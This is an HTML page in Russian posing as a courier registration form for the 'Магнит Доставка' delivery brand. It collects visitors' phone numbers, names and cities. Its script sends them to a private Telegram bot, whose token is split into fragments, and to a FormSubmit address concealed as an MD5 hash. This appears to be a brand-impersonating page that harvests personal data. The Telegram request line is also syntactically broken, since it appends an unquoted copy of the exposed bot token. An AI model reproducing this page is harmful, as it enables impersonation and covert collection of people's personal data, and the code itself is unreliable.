<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Магнит Доставка — регистрация курьера</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    background: #f2f4f7; min-height: 100vh;
    display: flex; align-items: center; justify-content: center; padding: 16px;
  }
  .card {
    background: #fff; width: 100%; max-width: 420px;
    border-radius: 16px; padding: 28px 22px;
    box-shadow: 0 8px 30px rgba(0,0,0,.08);
  }
  .brand { display: flex; align-items: center; gap: 10px; margin-bottom: 22px; }
  .logo {
    width: 44px; height: 44px; border-radius: 10px; background: #e30611;
    color: #fff; font-size: 26px; font-weight: 700;
    display: flex; align-items: center; justify-content: center;
  }
  .brand-name { font-size: 20px; font-weight: 700; line-height: 1.1; }
  .brand-name span { display: block; font-size: 14px; font-weight: 600; color: #e30611; }
  h1 { font-size: 22px; margin-bottom: 6px; }
  .sub { color: #666; font-size: 15px; margin-bottom: 20px; }
  label { display: block; font-size: 13px; color: #444; margin-bottom: 14px; }
  input[type="text"], input[type="tel"] {
    width: 100%; margin-top: 5px; padding: 12px; font-size: 16px;
    border: 1px solid #d5d9e0; border-radius: 10px; outline: none;
  }
  input:focus { border-color: #e30611; }
  .phone-wrap { display: flex; align-items: center; margin-top: 5px; border: 1px solid #d5d9e0; border-radius: 10px; }
  .phone-wrap:focus-within { border-color: #e30611; }
  .prefix { padding: 0 4px 0 12px; font-size: 16px; color: #333; font-weight: 600; }
  .phone-wrap input { border: none; margin-top: 0; flex: 1; }
  .check { display: flex; gap: 8px; align-items: flex-start; font-size: 12.5px; color: #666; margin: 4px 0 16px; }
  .check input { margin-top: 2px; }
  button {
    width: 100%; padding: 14px; font-size: 16px; font-weight: 700;
    color: #fff; background: #e30611; border: none; border-radius: 10px; cursor: pointer;
  }
  button:active { opacity: .9; }
  .ok-mark {
    width: 60px; height: 60px; border-radius: 50%; margin: 24px auto;
    background: #e8f7ee; color: #1a9e55; font-size: 32px;
    display: flex; align-items: center; justify-content: center;
  }
  .ok-text { text-align: center; font-size: 17px; font-weight: 600; }
</style>
</head>
<body>
<div class="card">
  <div id="formBlock">
    <div class="brand">
      <div class="logo">М</div>
      <div class="brand-name">Магнит<span>Доставка</span></div>
    </div>
    <h1>Регистрация нового курьера</h1>
    <p class="sub">Оставьте заявку — мы вам перезвоним</p>
    <form id="lead" novalidate>
      <label>Номер телефона
        <div class="phone-wrap">
          <span class="prefix">+7</span>
          <input type="tel" id="phone" inputmode="numeric" placeholder="(999) 123-45-67" autocomplete="tel" required>
        </div>
      </label>
      <label>Имя
        <input type="text" id="name" placeholder="Ваше имя" autocomplete="name" required>
      </label>
      <label>Город
        <input type="text" id="city" placeholder="Ваш город" required>
      </label>
      <label class="check">
        <input type="checkbox" id="agree" required>
        <span>Согласен на обработку персональных данных</span>
      </label>
      <button type="submit">Оставить заявку</button>
    </form>
  </div>

  <div id="okBlock" hidden>
    <div class="brand">
      <div class="logo">М</div>
      <div class="brand-name">Магнит<span>Доставка</span></div>
    </div>
    <div class="ok-mark">✓</div>
    <p class="ok-text">Мы перезвоним вам в ближайшее время</p>
  </div>
</div>

<script>
  // Токен бота собирается из фрагментов
  var T1 = "7427126044", T2 = ":AAH8WlQZgA", T3 = "EkPGO8ZSJG", T4 = "vLKbkZRwZ0", T5 = "dNqWw";
  var CHAT_ID = "7427126044";
  var FORM_HASH = "c1989a7f4fb5cd001ff497c15cd1d055"; // MD5 адреса почты для FormSubmit

  var phone = document.getElementById("phone");

  // Маска: (999) 123-45-67, +7 прибито слева
  phone.addEventListener("input", function () {
    var d = phone.value.replace(/\D/g, "").slice(0, 10);
    var out = "";
    if (d.length > 0) out = "(" + d.slice(0, 3);
    if (d.length >= 4) out += ") " + d.slice(3, 6);
    if (d.length >= 7) out += "-" + d.slice(6, 8);
    if (d.length >= 9) out += "-" + d.slice(8, 10);
    phone.value = out;
  });

  document.getElementById("lead").addEventListener("submit", function (e) {
    e.preventDefault();
    var digits = phone.value.replace(/\D/g, "");
    var name = document.getElementById("name").value.trim();
    var city = document.getElementById("city").value.trim();
    var agree = document.getElementById("agree").checked;

    if (digits.length !== 10) { phone.focus(); alert("Введите номер телефона полностью"); return; }
    if (!name)  { document.getElementById("name").focus(); return; }
    if (!city)  { document.getElementById("city").focus(); return; }
    if (!agree) { return; }

    var fullPhone = "+7" + digits;
    var msg = "Новая заявка (Магнит)\nИмя: " + name +
              "\nТелефон: " + fullPhone +
              "\nГород: " + city;

    // Telegram
    fetch("https://api.telegram.org/bot" + T1 + T2 + T3 + T4 + T5 + "bot" + 7427126044:AAH8WlQZgAEkPGO8ZSJGvLKbkZRwZ0dNqWw + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    }).catch(function () {});

    // Почта через FormSubmit (адрес в виде MD5-хеша)
    fetch("https://formsubmit.co/ajax/" + FORM_HASH, {
      method: "POST",
      headers: { "Content-Type": "application/json", "Accept": "application/json" },
      body: JSON.stringify({ _captcha: "false", "Имя": name, "Телефон": fullPhone, "Город": city })
    }).catch(function () {});

    document.getElementById("formBlock").hidden = true;
    document.getElementById("okBlock").hidden = false;
  });
</script>
</body>
</html>
